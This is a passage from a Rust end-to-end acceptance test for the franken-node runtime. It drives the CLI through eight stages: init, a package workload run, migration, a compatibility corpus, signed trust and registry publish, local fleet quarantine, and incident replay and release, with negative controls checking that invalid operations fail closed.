        FLEET_EPOCH_BARRIER_CERTIFIED_DRAIN_SCOPE, FleetAction, FleetActionRecord, FleetTargetKind,
        FleetTransport, NATIVE_SESSION_DRAIN_ATTESTATION_SCHEMA, NativeSessionDrainAttestation,
        NativeSessionDrainCheckpoint, NodeHealth, NodeStatus, SeqlockControlPage,
        fleet_application_checkpoint,
    };
    use frankenengine_node::control_plane::fleet_transport_http::{
        FleetHttpEpochBarrierRequest, HttpFleetTransport,
    };
    use frankenengine_verifier_sdk::incident_bundle::{
        IncidentBundleError, verify_incident_bundle,
    };
    use sha2::{Digest, Sha256};
    use std::sync::Arc;

    let bin_bytes = std::fs::read(franken_node_bin()).expect("read franken-node binary bytes");
    let binary_sha256 = format!("sha256:{}", hex::encode(Sha256::digest(&bin_bytes)));
    let mut stage_unknowns: Vec<Value> = Vec::new();
    let mut negative_controls: Vec<Value> = Vec::new();

    // -------------------------------------------------------------------------
    // Stage 1: Clean install/init + Ed25519 trust anchor setup
    // -------------------------------------------------------------------------
    let ws_dir = tempfile::TempDir::new().expect("workspace tempdir");
    let state_home = tempfile::TempDir::new().expect("xdg state home");
    let ws = ws_dir.path();

    for git_args in [
        &["init", "-b", "main"][..],
        &["config", "user.email", "operator@acme.example"][..],
        &["config", "user.name", "Composed Operator"][..],
        &[
            "remote",
            "add",
            "origin",
            "https://example.com/acme/composed-operator.git",
        ][..],
    ] {
        let st = Command::new("git")
            .current_dir(ws)
            .args(git_args)
            .status()
            .expect("git bootstrap");
        assert!(st.success(), "git {:?} failed", git_args);
    }

    let init_out = run_cli(ws, &["init", "--profile", "balanced", "--out-dir", "."]);
    assert!(
        init_out.status.success(),
        "Stage 1 init failed: {}",
        String::from_utf8_lossy(&init_out.stderr)
    );

    let seed_bytes = [0x5a_u8; 32];
    let signing_key = SigningKey::from_bytes(&seed_bytes);
    let verifying_key: VerifyingKey = signing_key.verifying_key();
    let public_key_hex = hex::encode(verifying_key.to_bytes());
    std::fs::create_dir_all(ws.join(".franken-node/keys")).expect("mkdir .franken-node/keys");
    let key_rel = ".franken-node/keys/receipt-signing.key";
    let pub_rel = ".franken-node/keys/receipt-signing.pub";
    std::fs::write(ws.join(key_rel), format!("{}\n", hex::encode(seed_bytes)))
        .expect("write signing key");
    std::fs::write(ws.join(pub_rel), format!("{public_key_hex}\n")).expect("write public key");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(ws.join(key_rel), std::fs::Permissions::from_mode(0o600))
            .expect("chmod 0600 signing key");
    }

    let config_path = ws.join("franken_node.toml");
    let mut cfg_toml = std::fs::read_to_string(&config_path).expect("read franken_node.toml");
    let signing_line = format!("decision_receipt_signing_key_path = \"{key_rel}\"\n");
    if let Some(pos) = cfg_toml.find("[security]\n") {
        cfg_toml.insert_str(pos + "[security]\n".len(), &signing_line);
    } else {
        cfg_toml.push_str("\n[security]\n");
        cfg_toml.push_str(&signing_line);
    }
    std::fs::write(&config_path, &cfg_toml).expect("patch franken_node.toml");
    let config_sha256 = format!(
        "sha256:{}",
        hex::encode(Sha256::digest(cfg_toml.as_bytes()))
    );
    layer_pass("C1 INIT", &format!("binary={binary_sha256}"));

    // -------------------------------------------------------------------------
    // Stage 2: Real multi-file + node_modules package workload (--frozen-modules)
    // -------------------------------------------------------------------------
    std::fs::create_dir_all(ws.join("lib")).expect("mkdir lib");
    std::fs::create_dir_all(ws.join("node_modules/@acme/banner")).expect("mkdir scoped pkg");
    std::fs::write(
        ws.join("package.json"),
        r#"{"name":"composed-app","version":"1.0.0","main":"index.cjs","engines":{"node":">=18"},"scripts":{"start":"node index.cjs"}}"#,
    )
    .expect("write package.json");
    std::fs::write(ws.join("lib/calc.cjs"), "exports.sum = (a, b) => a + b;\n")
        .expect("write lib/calc.cjs");
    std::fs::write(
        ws.join("node_modules/@acme/banner/package.json"),
        r#"{"name":"@acme/banner","version":"1.0.0","main":"index.cjs"}"#,
    )
    .expect("write @acme/banner/package.json");
    std::fs::write(
        ws.join("node_modules/@acme/banner/index.cjs"),
        "exports.tag = (n) => 'composed:' + n;\n",
    )
    .expect("write @acme/banner/index.cjs");
    std::fs::write(
        ws.join("index.cjs"),
        "const { sum } = require('./lib/calc.cjs');\nconst { tag } = require('@acme/banner');\nconsole.log(tag(sum(19, 23)));\n",
    )
    .expect("write index.cjs");

    for git_args in [
        &["add", "package.json", "index.cjs", "lib/calc.cjs"][..],
        &["commit", "-m", "seed multi-file workload"][..],
    ] {
        let st = Command::new("git")
            .current_dir(ws)
            .args(git_args)
            .status()
            .expect("git commit workload");
        assert!(st.success(), "git {:?} failed", git_args);
    }

    let run_out = Command::new(franken_node_bin())
        .current_dir(ws)
        .env("XDG_STATE_HOME", state_home.path())
        .args([
            "run",
            "index.cjs",
            "--policy",
            "balanced",
            "--runtime",
            "franken-engine",
            "--engine-bin",
            franken_node_bin(),
            "--frozen-modules",
            "--capture-replay",
            "--json",
            "--trace-id",
            "composed-operator-e2e-trace",
        ])
        .output()
        .expect("run multi-file workload");
    assert!(
        run_out.status.success(),
        "Stage 2 multi-file run failed: stdout={}\nstderr={}",
        String::from_utf8_lossy(&run_out.stdout),
        String::from_utf8_lossy(&run_out.stderr)
    );
    let run_json: Value =
        serde_json::from_slice(&run_out.stdout).expect("parse Stage 2 run --json");
    assert_eq!(
        run_json["dispatch"]["captured_output"]["stdout"].as_str(),
        Some("composed:42\n")
    );
    let receipt_id = run_json["receipt"]["receipt_id"]
        .as_str()
        .expect("Stage 2 receipt_id")
        .to_string();
    let attributed_pkgs = run_json["receipt"]["package_attribution"]["packages"]
        .as_array()
        .expect("package_attribution.packages");
    assert!(
        attributed_pkgs
            .iter()
            .any(|p| p["package_name"].as_str() == Some("@acme/banner")),
        "expected @acme/banner in package_attribution: {attributed_pkgs:?}"
    );
    layer_pass("C2 MULTI-FILE RUN", &format!("receipt_id={receipt_id}"));

    // -------------------------------------------------------------------------
    // Stage 3: Migrate audit + rewrite with explicit rollback identity
    // -------------------------------------------------------------------------
    let neg_rewrite = run_cli(ws, &["migrate", "rewrite", "--json"]);
    assert!(
        !neg_rewrite.status.success(),
        "missing path must fail closed"
    );
    negative_controls.push(json!({
        "stage": "migrate_rewrite",
        "control": "missing_project_path",
        "rejected": true,
    }));

    let mig_dir = tempfile::TempDir::new().expect("migrate tempdir");
    let mig_proj = mig_dir.path().join("legacy-proj");
    std::fs::create_dir_all(&mig_proj).expect("mkdir legacy-proj");
    std::fs::write(
        mig_proj.join("package.json"),
        r#"{"name":"legacy-proj","version":"1.0.0","engines":{"node":"16.x"},"scripts":{"start":"node index.js"}}"#,
    )
    .expect("write legacy package.json");
    std::fs::write(mig_proj.join("index.js"), "console.log('migrated');\n")
        .expect("write legacy index.js");

    let audit_out = run_cli(
        mig_dir.path(),
        &["migrate", "audit", "legacy-proj", "--format", "json"],
    );
    assert!(
        audit_out.status.success(),
        "Stage 3 migrate audit failed: {}",
        String::from_utf8_lossy(&audit_out.stderr)
    );
    let audit_json: Value = serde_json::from_slice(&audit_out.stdout).expect("parse audit json");

    let rollback_path = mig_dir.path().join("rollback-plan.json");
    let rewrite_out = run_cli(
        mig_dir.path(),
        &[
            "migrate",
            "rewrite",
            "legacy-proj",
            "--apply",
            "--json",
            "--emit-rollback",
            "rollback-plan.json",
        ],
    );
    assert!(
        rewrite_out.status.success(),
        "Stage 3 migrate rewrite failed: stdout={}\nstderr={}",
        String::from_utf8_lossy(&rewrite_out.stdout),
        String::from_utf8_lossy(&rewrite_out.stderr)
    );
    let rewrite_json: Value =
        serde_json::from_slice(&rewrite_out.stdout).expect("parse rewrite json");
    assert_eq!(rewrite_json["apply_mode"], true);
    let rollback_bytes = std::fs::read(&rollback_path).expect("read rollback-plan.json");
    let rollback_sha256 = format!("sha256:{}", hex::encode(Sha256::digest(&rollback_bytes)));
    let rollback_json: Value = serde_json::from_slice(&rollback_bytes).expect("parse rollback");
    assert!(
        rollback_json["entry_count"].as_u64().unwrap_or(0) >= 1,
        "rollback plan must record >=1 entry: {rollback_json}"
    );
    layer_pass(
        "C3 MIGRATE+ROLLBACK",
        &format!("rollback={rollback_sha256}"),
    );

    // -------------------------------------------------------------------------
    // Stage 4: Genuine lockstep oracle (retaining intentional failure + denominators)
    // -------------------------------------------------------------------------
    let lockstep_dir = tempfile::TempDir::new().expect("lockstep tempdir");
    let corpus_dir = lockstep_dir.path().join("corpus/os");
    std::fs::create_dir_all(&corpus_dir).expect("mkdir corpus/os");
    std::fs::write(
        corpus_dir.join("0001_os_pass.js"),
        "const os = require('os'); console.log(typeof os.platform());\n",
    )
    .expect("write 0001_os_pass.js");
    std::fs::write(
        corpus_dir.join("0002_ambient_refusal.js"),
        "console.log(process.release.name);\n",
    )
    .expect("write 0002_ambient_refusal.js");
    std::fs::write(
        corpus_dir.join("manifest.json"),
        serde_json::to_vec_pretty(&json!({
            "schema_version": "compat-corpus-fixture-v1",
            "api_family": "os",
            "investigation_bead_id": "bd-test0",
            "cases": [
                {
                    "id": "tc::os::0001",
                    "file": "0001_os_pass.js",
                    "api": "os.platform",
                    "requirement": "typeof os.platform() is string",
                    "divergence_axes": ["output", "exit"],
                    "band": "core",
                    "risk_band": "critical"
                },
                {
                    "id": "tc::os::0002",
                    "file": "0002_ambient_refusal.js",
                    "api": "process.release",
                    "requirement": "intentional ambient-authority refusal retained as failure",
                    "divergence_axes": ["output", "exit"],
                    "band": "edge",
                    "risk_band": "low"
                }
            ]
        }))
        .unwrap(),
    )
    .expect("write mini corpus manifest");

    let bun_ok = Command::new("bun")
        .arg("--version")
        .output()
        .is_ok_and(|o| o.status.success());
    let node_ok = Command::new("node")
        .args(["-e", "process.exit(typeof Bun === 'undefined' ? 0 : 1)"])
        .output()
        .is_ok_and(|o| o.status.success());

    let lockstep_summary = if bun_ok {
        let mut ls_args = vec![
            "ops",
            "compat-corpus-run",
            "--corpus-root",
            "corpus",
            "--out",
            "results.json",
            "--case-timeout-secs",
            "15",
            "--json",
        ];
        if node_ok {
            ls_args.push("--require-node-reference");
        } else {
            stage_unknowns.push(json!({
                "stage": "lockstep_oracle",
                "unknown": "distinct node binary absent on worker PATH; executed dyad bun+franken-engine-native",
            }));
        }
        let ls_out = Command::new(franken_node_bin())
            .current_dir(lockstep_dir.path())
            .args(&ls_args)
            .output()
            .expect("ops compat-corpus-run");
        assert!(
            ls_out.status.success(),
            "Stage 4 compat-corpus-run failed: stdout={}\nstderr={}",
            String::from_utf8_lossy(&ls_out.stdout),
            String::from_utf8_lossy(&ls_out.stderr)
        );
        let results: Value = serde_json::from_slice(
            &std::fs::read(lockstep_dir.path().join("results.json")).expect("read results.json"),
        )
        .expect("parse results.json");
        assert_eq!(results["totals"]["total_test_cases"], 2);
        assert_eq!(results["totals"]["passed_test_cases"], 1);
        assert_eq!(results["totals"]["failed_test_cases"], 1);
        assert_eq!(
            results["failing_tests_tracking"].as_array().map(Vec::len),
            Some(1)
        );
        negative_controls.push(json!({
            "stage": "lockstep_oracle",
            "control": "tc::os::0002_ambient_refusal_retained",
            "rejected": true,
        }));
        json!({
            "executed": true,
            "topology": results["corpus"]["lockstep_topology"],
            "reference_runtimes": results["corpus"]["reference_runtimes"],
            "policy_mode": results["corpus"]["policy_mode"],
            "total_cases": results["totals"]["total_test_cases"],
            "passed_cases": results["totals"]["passed_test_cases"],
            "failed_cases": results["totals"]["failed_test_cases"],
            "result_digest": results["corpus"]["result_digest"],
            "retained_failures": results["failing_tests_tracking"],
        })
    } else {
        stage_unknowns.push(json!({
            "stage": "lockstep_oracle",
            "unknown": "bun binary not present on worker PATH; live lockstep leg skipped",
        }));
        json!({ "executed": false, "reason": "bun_missing_on_worker_path" })
    };
    layer_pass("C4 LOCKSTEP ORACLE", &format!("executed={bun_ok}"));

    // -------------------------------------------------------------------------
    // Stage 5: Signed trust signal/refusal (IFC declassification + registry)
    // -------------------------------------------------------------------------
    let wildcard_refusal = run_cli(
        ws,
        &[
            "trust",
            "sign-declassification",
            "--sink",
            "*.wildcard.example:443",
            "--label",
            "secret_file",
            "--actor",
            "ops@acme.example",
            "--purpose",
            "negative-control",
            "--json",
        ],
    );
    assert!(
        !wildcard_refusal.status.success(),
        "wildcard sink must fail closed"
    );
    negative_controls.push(json!({
        "stage": "signed_trust",
        "control": "wildcard_declassification_sink_refused",
        "rejected": true,
    }));

    let signed_declass_out = run_cli(
        ws,
        &[
            "trust",
            "sign-declassification",
            "--sink",
            "127.0.0.1:8443",
            "--label",
            "secret_file",
            "--actor",
            "ops@acme.example",
            "--purpose",
            "composed-acceptance-audit",
            "--ttl-secs",
            "600",
            "--json",
        ],
    );
    assert!(
        signed_declass_out.status.success(),
        "trust sign-declassification failed: {}",
        String::from_utf8_lossy(&signed_declass_out.stderr)
    );
    let signed_declass: Value =
        serde_json::from_slice(&signed_declass_out.stdout).expect("parse declass json");

    std::fs::create_dir_all(ws.join("dist")).expect("mkdir dist");
    let dir_pub_refusal = run_cli(
        ws,
        &[
            "registry",
            "publish",
            "./dist",
            "--version",
            "1.0.0",
            "--signing-key",
            key_rel,
            "--json",
        ],
    );
    assert!(
        !dir_pub_refusal.status.success(),
        "directory publish target must fail closed"
    );
    negative_controls.push(json!({
        "stage": "signed_trust",
        "control": "registry_publish_directory_refused",
        "rejected": true,
    }));

    std::fs::write(
        ws.join("dist/composed.tgz"),
        b"composed-extension-archive-v1",
    )
    .expect("write dist/composed.tgz");
    let reg_pub_out = run_cli(
        ws,
        &[
            "registry",
            "publish",
            "./dist/composed.tgz",
            "--version",
            "1.0.0",
            "--signing-key",
            key_rel,
            "--json",
        ],
    );
    assert!(
        reg_pub_out.status.success(),
        "registry publish failed: stdout={}\nstderr={}",
        String::from_utf8_lossy(&reg_pub_out.stdout),
        String::from_utf8_lossy(&reg_pub_out.stderr)
    );
    let reg_pub: Value = serde_json::from_slice(&reg_pub_out.stdout).expect("parse reg publish");
    let ext_id = reg_pub["extension_id"]
        .as_str()
        .expect("published extension_id");
    let reg_ver_out = run_cli(ws, &["registry", "verify", ext_id, "--json"]);
    assert!(reg_ver_out.status.success(), "registry verify failed");
    let reg_ver: Value = serde_json::from_slice(&reg_ver_out.stdout).expect("parse reg verify");
    assert_eq!(reg_ver["integrity"], "verified");
    layer_pass("C5 TRUST+REGISTRY", &format!("extension_id={ext_id}"));

    // -------------------------------------------------------------------------
    // Stage 6: Real HTTP fleet quarantine + enrolled epoch-barrier quiescence
    // -------------------------------------------------------------------------
    let local_fleet_status = run_cli(ws, &["fleet", "status", "--json"]);
    assert!(local_fleet_status.status.success());
    let local_fleet_json: Value =
        serde_json::from_slice(&local_fleet_status.stdout).expect("parse local fleet status");
    assert!(
        !local_fleet_json["fleet_quiescence_certified"]
            .as_bool()
            .unwrap_or(false),
        "single-node local fleet status must never claim certified fleet quiescence"
    );
    negative_controls.push(json!({
        "stage": "fleet_quiescence",
        "control": "single_node_local_status_unverified",
        "rejected": true,
    }));

    let fleet_dir = tempfile::TempDir::new().expect("fleet coordinator tempdir");
    let coordinator_state = fleet_dir.path().join("coordinator-state");
    let operator_token = "composed-op-token-0123456789abcdef01234567";
    let node_a_token = "composed-node-a-token-0123456789abcdef0123";
    let node_b_token = "composed-node-b-token-0123456789abcdef0123";
    let sup_a = SigningKey::from_bytes(&[0x31; 32]);
    let sup_b = SigningKey::from_bytes(&[0x42; 32]);

    let creds_json = serde_json::to_vec(&json!({
        "schema_version": "franken-node/fleet-node-credentials/v1",
        "nodes": [
            {
                "zone_id": "prod-east",
                "node_id": "node-a",
                "token_sha256": hex::encode(Sha256::digest(node_a_token.as_bytes())),
                "supervisor_public_key_hex": hex::encode(sup_a.verifying_key().as_bytes()),
            },
            {
                "zone_id": "prod-east",
                "node_id": "node-b",
                "token_sha256": hex::encode(Sha256::digest(node_b_token.as_bytes())),
                "supervisor_public_key_hex": hex::encode(sup_b.verifying_key().as_bytes()),
            }
        ]
    }))
    .expect("creds json");
    let creds = FleetNodeCredentials::from_json(&creds_json).expect("enrolled node credentials");
    let service = Arc::new(
        FleetControlPlaneService::open(coordinator_state.clone(), operator_token)
            .expect("open fleet service")
            .with_node_credentials(creds)
            .expect("attach enrolled credentials"),
    );
    let server_ctl = FleetHttpServerControl::new();
    let server_ctl_bg = Arc::clone(&server_ctl);
    let (addr_tx, addr_rx) = std::sync::mpsc::sync_channel(1);
    let server_join = std::thread::spawn(move || {
        serve_fleet_control_plane(
            service,
            &FleetHttpServerConfig {
                bind: "127.0.0.1:0".to_string(),
                max_requests: None,
            },
            server_ctl_bg,
            Arc::new(move |ev| {
                if ev.event_code == FLEET_HTTP_LISTENING
                    && let Some(addr) = &ev.bound_addr
                {
                    let _ = addr_tx.send(addr.clone());
                }
            }),
        )
    });
    let bound_addr = addr_rx
        .recv_timeout(Duration::from_secs(5))
        .expect("fleet HTTP server listening");
    let base_url = format!("http://{bound_addr}");

    let mut operator_http =
        HttpFleetTransport::new(&base_url, operator_token, Duration::from_secs(5))
            .expect("operator http");
    let mut agent_a_http = HttpFleetTransport::new(&base_url, node_a_token, Duration::from_secs(5))
        .expect("agent a http");
    let mut agent_b_http = HttpFleetTransport::new(&base_url, node_b_token, Duration::from_secs(5))
        .expect("agent b http");
    operator_http.initialize().expect("operator init");

    let quarantine_rec = FleetActionRecord {
        action_id: "composed-quarantine-1".to_string(),
        emitted_at: Utc::now(),
        action: FleetAction::Quarantine {
            zone_id: "prod-east".to_string(),
            incident_id: "inc-composed-1".to_string(),
            target_id: format!("ext:{ext_id}"),
            target_kind: FleetTargetKind::Extension,
            quarantine_version: 1,
            reason: "contain suspect extension for incident replay".to_string(),
        },
    };
    operator_http
        .publish_action(&quarantine_rec)
        .expect("publish quarantine");
    let hold_rec = FleetActionRecord {
        action_id: "composed-hold-1".to_string(),
        emitted_at: Utc::now(),
        action: FleetAction::NativeSessionHold {
            zone_id: "prod-east".to_string(),
            reason: "fence admissions during epoch barrier".to_string(),
        },
    };
    operator_http
        .publish_action(&hold_rec)
        .expect("publish hold");

    let expected_cp =
        fleet_application_checkpoint(&operator_http.list_actions().unwrap(), "prod-east")
            .expect("checkpoint");
    let make_hb = |node_id: &str, key: &SigningKey, generation: u64| {
        let now = Utc::now();
        let mut drain = NativeSessionDrainCheckpoint {
            applied_actions: expected_cp.clone(),
            session_set_sha256: format!("{generation:02x}").repeat(32),
            admitted_sessions: 1,
            terminal_sessions: 1,
            pending_sessions: 0,
            indeterminate_sessions: 0,
            fence_held: true,
            supervisor_attestation: None,
        };
        let mut att = NativeSessionDrainAttestation {
            schema_version: NATIVE_SESSION_DRAIN_ATTESTATION_SCHEMA.to_string(),
            node_id: node_id.to_string(),
            zone_id: "prod-east".to_string(),
            drain_id: uuid::Uuid::now_v7().to_string(),
            generation,
            project_root_sha256: hex::encode(Sha256::digest(node_id.as_bytes())),
            observed_at: now,
            product_root_key_id: format!("ed25519:{}", hex::encode(key.verifying_key().as_bytes())),
            checkpoint_sha256: drain.observation_sha256().expect("checkpoint sha256"),
            signature_hex: String::new(),
        };
        att.signature_hex = hex::encode(key.sign(&att.signing_payload().unwrap()).to_bytes());
        drain.supervisor_attestation = Some(att);
        NodeStatus {
            zone_id: "prod-east".to_string(),
            node_id: node_id.to_string(),
            last_seen: now,
            quarantine_version: 1,
            health: NodeHealth::Maintenance,
            applied_actions: Some(expected_cp.clone()),
            native_session_drain: Some(drain),
        }
    };

    agent_a_http
        .upsert_node_status(&make_hb("node-a", &sup_a, 1))
        .expect("node-a hb");
    let missing_b_err = operator_http
        .certify_epoch_barrier(&FleetHttpEpochBarrierRequest {
            initiator: "composed-ops".to_string(),
            reason: "quarantine-advance".to_string(),
            trace_id: "composed-barrier-missing".to_string(),
            stale_after: Duration::from_secs(30),
            operation_id: None,
            expected_action_log: None,
        })
        .expect_err("missing node-b must abort barrier")
        .to_string();
    assert!(missing_b_err.contains("HTTP 409"), "{missing_b_err}");
    negative_controls.push(json!({
        "stage": "fleet_quiescence",
        "control": "missing_enrolled_node_aborts_epoch_barrier_http_409",
        "rejected": true,
    }));

    agent_b_http
        .upsert_node_status(&make_hb("node-b", &sup_b, 1))
        .expect("node-b hb");
    let certified = operator_http
        .certify_epoch_barrier(&FleetHttpEpochBarrierRequest {
            initiator: "composed-ops".to_string(),
            reason: "quarantine-advance".to_string(),
            trace_id: "composed-barrier-commit".to_string(),
            stale_after: Duration::from_secs(30),
            operation_id: None,
            expected_action_log: None,
        })
        .expect("enrolled supervisors certify epoch barrier");
    assert!(certified.evidence.fleet_quiescence_certified);
    assert_eq!(
        certified.evidence.scope,
        FLEET_EPOCH_BARRIER_CERTIFIED_DRAIN_SCOPE
    );
    assert_eq!(certified.certificate.committed_epoch, 1);
    let seqlock = SeqlockControlPage::read_shared_page(&coordinator_state.join("seqlock.page"))
        .expect("read persisted seqlock page");
    assert_eq!(seqlock.control_epoch, 1);
    layer_pass("C6 FLEET QUIESCENCE", "epoch=0->1 certified=true");

    // -------------------------------------------------------------------------
    // Stage 7: Authenticated incident capture/bundle, offline native replay & SDK
    // -------------------------------------------------------------------------
    let cap_out = Command::new(franken_node_bin())
        .current_dir(ws)
        .env("XDG_STATE_HOME", state_home.path())
        .args(["incident", "capture", "--from-run", &receipt_id, "--json"])
        .output()
        .expect("incident capture --from-run");
    assert!(
        cap_out.status.success(),
        "Stage 7 incident capture failed: {}",
        String::from_utf8_lossy(&cap_out.stderr)
    );
    let cap_json: Value = serde_json::from_slice(&cap_out.stdout).expect("parse capture json");
    assert_eq!(cap_json["native_replay_available"], true);
    let incident_id = cap_json["incident_id"]
        .as_str()
        .expect("captured incident_id")
        .to_string();

    let bundle_out = Command::new(franken_node_bin())
        .current_dir(ws)
        .env("XDG_STATE_HOME", state_home.path())
        .args([
            "incident",
            "bundle",
            "--id",
            &incident_id,
            "--verify",
            "--json",
        ])
        .output()
        .expect("incident bundle --verify");
    assert!(
        bundle_out.status.success(),
        "Stage 7 incident bundle failed: {}",
        String::from_utf8_lossy(&bundle_out.stderr)
    );
    let bundle_name = format!("{incident_id}.fnbundle");
    let bundle_bytes = std::fs::read(ws.join(&bundle_name)).expect("read exported .fnbundle");
    let bundle_sha256 = format!("sha256:{}", hex::encode(Sha256::digest(&bundle_bytes)));

    // Move live workspace module files aside to prove offline multi-file native replay.
    let retired_src = mig_dir.path().join("retired-live-sources");
    std::fs::create_dir_all(&retired_src).expect("mkdir retired-live-sources");
    std::fs::rename(ws.join("index.cjs"), retired_src.join("index.cjs")).expect("move index.cjs");
    std::fs::rename(ws.join("lib"), retired_src.join("lib")).expect("move lib/");
    std::fs::rename(ws.join("node_modules"), retired_src.join("node_modules"))
        .expect("move node_modules/");

    let replay_out = Command::new(franken_node_bin())
        .current_dir(ws)
        .env("XDG_STATE_HOME", state_home.path())
        .args([
            "incident",
            "replay",
            "--bundle",
            &bundle_name,
            "--execute",
            "--trusted-public-key",
            pub_rel,
            "--json",
        ])
        .output()
        .expect("incident replay --execute");
    assert!(
        replay_out.status.success(),
        "Stage 7 offline native replay failed: stdout={}\nstderr={}",
        String::from_utf8_lossy(&replay_out.stdout),
        String::from_utf8_lossy(&replay_out.stderr)
    );
    let replay_json: Value = serde_json::from_slice(&replay_out.stdout).expect("parse replay json");
    assert_eq!(replay_json["execution_result"]["matched"], true);
    assert_eq!(replay_json["execution_result"]["console_match"], true);
    assert_eq!(
        replay_json["execution_result"]["verification_scope"],
        "guest_execution"
    );

    // Independent Verifier SDK verification + foreign trust-anchor negative control.
    let sdk_verified = verify_incident_bundle(&bundle_bytes, &verifying_key)
        .expect("standalone Verifier SDK must verify CLI .fnbundle");
    assert_eq!(sdk_verified.incident_id, incident_id);
    assert_eq!(sdk_verified.signer_public_key_hex, public_key_hex);
    let foreign_vk = SigningKey::from_bytes(&[0x99; 32]).verifying_key();
    assert_eq!(
        verify_incident_bundle(&bundle_bytes, &foreign_vk),
        Err(IncidentBundleError::SignerNotTrusted)
    );
    negative_controls.push(json!({
        "stage": "verifier_sdk",
        "control": "foreign_trust_anchor_rejected_signer_not_trusted",
        "rejected": true,
    }));
    layer_pass("C7 OFFLINE REPLAY+SDK", &format!("bundle={bundle_sha256}"));

    // -------------------------------------------------------------------------
    // Stage 8: Controlled release & recovery + complete acceptance report
    // -------------------------------------------------------------------------
    operator_http
        .publish_action(&FleetActionRecord {
            action_id: "composed-release-1".to_string(),
            emitted_at: Utc::now(),
            action: FleetAction::Release {
                zone_id: "prod-east".to_string(),
                incident_id: "inc-composed-1".to_string(),
                reason: Some("offline replay and SDK audit passed".to_string()),
            },
        })
        .expect("publish fleet release");
    operator_http
        .publish_action(&FleetActionRecord {
            action_id: "composed-resume-1".to_string(),
            emitted_at: Utc::now(),
            action: FleetAction::NativeSessionResume {
                zone_id: "prod-east".to_string(),
                hold_action_id: hold_rec.action_id.clone(),
                reason: Some("reopen native admissions after verified release".to_string()),
            },
        })
        .expect("publish native session resume");
    let final_actions = operator_http.list_actions().expect("final fleet actions");
    assert_eq!(final_actions.len(), 4);

    server_ctl.request_shutdown();
    let _ = std::net::TcpStream::connect(&bound_addr);
    server_join
        .join()
        .expect("join fleet server")
        .expect("fleet server clean exit");

    std::fs::rename(retired_src.join("index.cjs"), ws.join("index.cjs"))
        .expect("restore index.cjs");
    std::fs::rename(retired_src.join("lib"), ws.join("lib")).expect("restore lib/");
    std::fs::rename(retired_src.join("node_modules"), ws.join("node_modules"))
        .expect("restore node_modules/");

    let rollout_status_out = run_cli(
        ws,
        &["migrate", "rollout", ".", "--action", "status", "--json"],
    );
    assert!(
        rollout_status_out.status.success(),
        "migrate rollout status failed: {}",
        String::from_utf8_lossy(&rollout_status_out.stderr)
    );
    let rollout_status: Value =
        serde_json::from_slice(&rollout_status_out.stdout).expect("parse rollout status");

    let acceptance_report = json!({
        "schema_version": "franken-node/composed-operator-acceptance-report/v1",
        "bead_id": "bd-rjc2m.3",
        "binary_path": franken_node_bin(),
        "binary_sha256": binary_sha256,
        "config_sha256": config_sha256,
        "trust_anchors": {
            "workspace_receipt_public_key_hex": public_key_hex,
            "fleet_supervisor_node_a_public_key_hex": hex::encode(sup_a.verifying_key().as_bytes()),
            "fleet_supervisor_node_b_public_key_hex": hex::encode(sup_b.verifying_key().as_bytes()),
        },
        "stages": {
            "clean_init": { "ok": true, "profile": "balanced" },
            "multi_file_package_workload": {
                "ok": true,
                "receipt_id": receipt_id,
                "attributed_package_count": attributed_pkgs.len(),
            },
            "migrate_audit_rewrite_rollback": {
                "ok": true,
                "audit_files_scanned": audit_json["summary"]["files_scanned"],
                "rewrites_applied": rewrite_json["rewrites_applied"],
                "rollback_plan_sha256": rollback_sha256,
                "rollback_entry_count": rollback_json["entry_count"],
            },
            "lockstep_oracle": lockstep_summary,
            "signed_trust_and_registry": {
                "ok": true,
                "declassification_sink": signed_declass["rule"]["sink"],
                "published_extension_id": ext_id,
                "verified_integrity": reg_ver["integrity"],
            },
            "fleet_quarantine_and_quiescence": {
                "ok": true,
                "committed_epoch": certified.certificate.committed_epoch,
                "fleet_quiescence_certified": certified.evidence.fleet_quiescence_certified,
                "seqlock_control_epoch": seqlock.control_epoch,
            },
            "incident_bundle_offline_replay_and_sdk": {
                "ok": true,
                "incident_id": incident_id,
                "bundle_sha256": bundle_sha256,
                "offline_replay_matched": replay_json["execution_result"]["matched"],
                "verification_scope": replay_json["execution_result"]["verification_scope"],
                "sdk_verified_signer": sdk_verified.signer_public_key_hex,
            },
            "controlled_release_and_recovery": {
                "ok": true,
                "fleet_actions_recorded": final_actions.len(),
                "rollout_stage": rollout_status["stage"],
            },
        },
        "negative_controls": negative_controls,
        "stage_specific_unknowns": stage_unknowns,
    });
    let report_bytes = serde_json::to_vec_pretty(&acceptance_report).expect("serialize report");
    std::fs::write(
        ws.join("composed_operator_acceptance_report.json"),
        &report_bytes,
    )
    .expect("write workspace acceptance report");
    if let Some(out_path) = std::env::var_os("FRANKEN_COMPOSED_ACCEPTANCE_REPORT_PATH") {
        let out_path = std::path::PathBuf::from(out_path);
        if let Some(parent) = out_path.parent() {
            std::fs::create_dir_all(parent).expect("mkdir report parent");
        }
        std::fs::write(&out_path, &report_bytes).expect("write explicit acceptance report");
    }
    layer_pass("C8 RELEASE+REPORT", "all 8 composed stages verified");
}
